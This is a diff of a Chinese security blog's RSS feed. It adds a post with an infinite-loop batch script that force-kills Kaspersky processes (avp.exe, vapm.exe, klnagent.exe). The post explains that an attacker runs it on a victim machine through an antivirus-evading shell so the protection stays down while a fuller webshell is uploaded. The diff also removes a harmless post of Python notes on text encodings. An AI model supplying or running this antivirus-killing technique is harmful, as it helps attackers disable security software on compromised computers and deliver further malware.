@@ -5,9 +5,41 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Thu, 30 Aug 2018 05:31:27 -0400</pubDate>
-    <lastBuildDate>Thu, 30 Aug 2018 05:31:27 -0400</lastBuildDate>
+    <pubDate>Fri, 31 Aug 2018 04:15:05 -0400</pubDate>
+    <lastBuildDate>Fri, 31 Aug 2018 04:15:05 -0400</lastBuildDate>
     <generator>Jekyll v3.7.3</generator>
+    
+      <item>
+        <title>管理员权限杀卡巴斯基进程</title>
+        <description>&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:start
+taskkill /F /IM avp.exe
+taskkill /F /IM vapm.exe
+taskkill /F /IM klnagent.exe
+goto start
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
+
+&lt;p&gt;可用于一个管理员权限运行的免杀shell中执行这个批处理文件,运行后会不断强制杀死kaspersky的进程,但不会彻底杀掉,因为kaspersky会自动复活,但上面这个无限循环可使kaspersky的保护功能失效.可用上的场景:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;1.受害机当前用户为administrator&lt;/li&gt;
+  &lt;li&gt;2.受害机运行了一个免杀的shell(功能有限的shell,功能越少越好免杀),这个shell只有执行命令的功能&lt;/li&gt;
+  &lt;li&gt;3.通过shell运行上面的批处理”杀死“kaspersky后再上大马，大马可不用免杀&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Fri, 31 Aug 2018 00:00:00 -0400</pubDate>
+        <link>http://3xp10it.cc/web/2018/08/31/%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%9D%80%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E8%BF%9B%E7%A8%8B/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2018/08/31/%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%9D%80%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E8%BF%9B%E7%A8%8B/</guid>
+        
+        <category>kaspersky</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>web安全测试常规流程</title>
@@ -519,86 +551,6 @@ Out[38]: 1
         <pubDate>Thu, 01 Mar 2018 00:00:00 -0500</pubDate>
         <link>http://3xp10it.cc/python/2018/03/01/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC5-7%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
         <guid isPermaLink="true">http://localhost:4000/python/2018/03/01/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC5-7%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
-        
-        <category>python</category>
-        
-        
-        <category>python</category>
-        
-      </item>
-    
-      <item>
-        <title>流畅的python第4章笔记</title>
-        <description>&lt;h3 id=&quot;文本和字节序列&quot;&gt;文本和字节序列&lt;/h3&gt;
-
-&lt;p&gt;1.unicode与utf-8的&lt;a href=&quot;http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html&quot;&gt;关系&lt;/a&gt;
-UTF-8就是在互联网上使用最广的一种unicode的实现方式(80%的网站已经使用UTF8),这是为传输而设计的编码,并使编码无国界,这样就可以显示全世界上所有文化的字符了.UTF-8最大的一个特点,就是它是一种变长的编码方式.它可以使用1~4个字节表示一个符号,根据不同的符号而变化字节长度,当字符在ASCII码的范围时,就用一个字节表示,保留了ASCII字符一个字节的编码做为它的一部分,注意的是unicode一个中文字符占2个字节,而UTF-8一个中文字符占3个字节)&lt;/p&gt;
-
-&lt;p&gt;2.struct模块提供了一些函数,把字节序列转换成不同类型字段组成的元组(&lt;code class=&quot;highlighter-rouge&quot;&gt;struct.unpack&lt;/code&gt;),还有一些函数用于执行反向转换,把元组转换成字节序列(&lt;code class=&quot;highlighter-rouge&quot;&gt;struct.pack&lt;/code&gt;).struct模块能处理bytes,bytearray和memoryview对象&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [62]: struct.unpack('ii',b'\x0c\x00\x00\x00\r\x00\x00\x00')
-Out[62]: (12, 13)
-
-In [63]: struct.pack('ii',12,13)
-Out[63]: b'\x0c\x00\x00\x00\r\x00\x00\x00'
-
-
-In [70]: import struct
-
-In [71]: with open('/Users/3xp10it/Downloads/1.gif','rb') as fp:
-    ...:     img=memoryview(fp.read())
-
-In [72]: img
-Out[72]: &amp;lt;memory at 0x109972e88&amp;gt;
-
-In [73]: header=img[:10]
-
-In [74]: header
-Out[74]: &amp;lt;memory at 0x109c13048&amp;gt;
-
-In [75]: bytes(header)
-Out[75]: b'GIF89a\x90\x01\x90\x01'
-
-In [76]: fmt='&amp;lt;3s3sHH'
-
-In [77]: struct.unpack(fmt,header)
-Out[77]: (b'GIF', b'89a', 400, 400)
-
-In [78]: del header
-
-In [79]: del img
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;3.python自带了超过100种编解码器,用于在文本和字节之间相互转换.每个编解码器都有一个名称,如’utf_8’,而且经常有几个别名,如’utf8’,’utf-8’,’U8’.&lt;/p&gt;
-
-&lt;p&gt;4.python3允许在源码中使用非ascii标识符.有些人不喜欢这么做.支持始终使用ascii标识符的人认为,这样便于所有人阅读和编辑代码.这些人没切中要害:源码应该便于目标群体阅读和编辑,而不是”所有人”.如果代码属于跨国公司,或者是开源的,想让来自世界各地的人作贡献,那么标识符应该使用英语,也就是说只能使用ascii字符.但是,如果你是巴西的一位老师,那么使用葡萄牙语正确拼写变量和函数名更便于学生阅读代码&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [81]: 笔='钢笔'
-
-In [82]: print(笔)
-钢笔
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;5.utf8的一在优势是,不管设备使用哪种字节序(大端或小端),生成的字节序列始终一致,因此不需要BOM(在文件头部的字节序标记,一些编辑器会给文件加BOM,如notepad).尽管如此,某些windows应用(如notepad)还是会在utf8编码的文件中添加BOM;而且,EXCEL会根据有没有BOM确定文件是不是UTF8编码&lt;/p&gt;
-
-&lt;p&gt;6.需要在多台设备中或多种场合下运行的代码,一定不能依赖默认编码.打开文件时始终应该明确传入encoding参数,因为不同的设备使用的默认编码可能不同,有时隔一天也会发生变化&lt;/p&gt;
-
-&lt;p&gt;7.&lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;会把string表达的内容当作代码执行&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [89]: eval('print(111)')
-111
-
-In [90]: a='[1,2]'
-In [91]: eval(a)
-Out[91]: [1, 2]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;8.windows中,&lt;code class=&quot;highlighter-rouge&quot;&gt;locale.getpreferredencoding()&lt;/code&gt;返回的编码是最重要的:这是打开文件的默认编码,也是重定向到文件的sys.stdout/stdin/stderr的默认编码.关于编码默认值的最佳建议是:别依赖默认值&lt;/p&gt;
-
-</description>
-        <pubDate>Wed, 28 Feb 2018 00:00:00 -0500</pubDate>
-        <link>http://3xp10it.cc/python/2018/02/28/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
-        <guid isPermaLink="true">http://localhost:4000/python/2018/02/28/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
         
         <category>python</category>
         
